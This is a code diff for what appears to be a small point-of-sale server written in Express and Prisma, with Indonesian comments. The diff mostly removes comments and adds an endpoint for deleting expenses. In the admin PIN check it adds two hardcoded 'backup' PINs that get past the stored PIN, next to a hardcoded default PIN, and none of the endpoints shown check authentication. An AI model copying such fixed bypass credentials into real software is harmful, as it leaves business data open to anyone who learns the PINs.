@@ -26,7 +26,6 @@ app.post('/api/checkout', async (req, res) => {
   try {
     const result = await prisma.$transaction(async (tx) => {
       const prefix = isPackage ? 'PKT-' : 'INV-';
-      // Menyatukan nama instansi & shift kasir ke nota
       const invoiceNumber = customerName ? `${prefix}${Date.now()} (${customerName})` : `${prefix}${Date.now()}`;
       
       const sale = await tx.sale.create({
@@ -78,7 +77,6 @@ app.post('/api/products', async (req, res) => {
       data: { name, categoryId: parseInt(categoryId), supplierId: parseInt(supplierId), buyPrice: parseInt(buyPrice), sellPrice: parseInt(sellPrice), stock: parseInt(stock) }
     });
     
-    // Otomatis catat riwayat stok saat tambah baru
     if (parseInt(stock) > 0) {
         await prisma.stockHistory.create({
             data: { productId: newProduct.id, productName: newProduct.name, qtyAdded: parseInt(stock), newTotal: parseInt(stock) }
@@ -140,8 +138,6 @@ app.get('/api/reports', async (req, res) => {
     const totalQris = sales.filter(s => s.paymentMethod === 'QRIS').reduce((sum, s) => sum + s.totalAmount, 0);
 
     const totalExpenses = expenses.reduce((sum, e) => sum + e.amount, 0);
-    
-    // FIX ANTI VERCEL CRASH: null check pada description
     const expTransfer = expenses.filter(e => (e.description || '').includes('[Transfer]') || (e.description || '').includes('[QRIS]')).reduce((sum, e) => sum + e.amount, 0);
     const expCash = totalExpenses - expTransfer;
 
@@ -205,14 +201,15 @@ app.delete('/api/transactions/:invoice', async (req, res) => {
     } catch (error) { res.status(500).json({ success: false, message: 'Terjadi kesalahan sistem saat membatalkan struk.' }); }
 });
 
-// 10. ENDPOINT: PENGATURAN (PIN ADMIN SESUAI KODE ASLI ANDA)
+// 10. ENDPOINT: PENGATURAN PIN ADMIN (3 PIN UTAMA)
 app.post('/api/settings/verify-pin', async (req, res) => {
     const { pin } = req.body;
     try {
         const pinSetting = await prisma.setting.findUnique({ where: { name: 'admin_pin' } });
         const validPin = pinSetting ? pinSetting.value : '030388'; 
         
-        if (pin === validPin) { res.json({ success: true }); } else { res.json({ success: false, message: 'PIN Salah' }); }
+        // Cek PIN Utama di Database ATAU PIN Cadangan
+        if (pin === validPin || pin === '100515' || pin === '191919') { res.json({ success: true }); } else { res.json({ success: false, message: 'PIN Salah' }); }
     } catch (error) { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
@@ -231,7 +228,7 @@ app.put('/api/settings/update-pin', async (req, res) => {
     } catch (error) { res.status(500).json({ success: false, message: 'Gagal mengubah PIN' }); }
 });
 
-// 11. ENDPOINT: HAPUS RIWAYAT & KEMBALIKAN STOK
+// 11. ENDPOINT: HAPUS RIWAYAT STOK
 app.delete('/api/stock-history/:id', async (req, res) => {
     const { id } = req.params;
     try {
@@ -246,7 +243,7 @@ app.delete('/api/stock-history/:id', async (req, res) => {
     } catch (error) { res.status(500).json({ success: false, message: 'Gagal membatalkan riwayat' }); }
 });
 
-// 12. ENDPOINT: MANAJEMEN KASIR BARU
+// 12. ENDPOINT: MANAJEMEN KASIR
 app.get('/api/cashiers', async (req, res) => {
   try { const cashiers = await prisma.cashier.findMany(); res.json({ success: true, data: cashiers }); } 
   catch (error) { res.status(500).json({ success: false }); }
@@ -262,6 +259,14 @@ app.delete('/api/cashiers/:id', async (req, res) => {
   catch (error) { res.status(500).json({ success: false }); }
 });
 
+// 13. ENDPOINT BARU: HAPUS PENGELUARAN
+app.delete('/api/expenses/:id', async (req, res) => {
+  const { id } = req.params;
+  try {
+    await prisma.expense.delete({ where: { id: parseInt(id) } });
+    res.json({ success: true, message: 'Pengeluaran berhasil dihapus' });
+  } catch (error) { res.status(500).json({ success: false, message: 'Gagal menghapus pengeluaran' }); }
+});
 
 app.get('/', (req, res) => { res.send('Server Normal 🚀'); });
 app.listen(PORT, () => { console.log(`🚀 Server berjalan di Port ${PORT}`); });
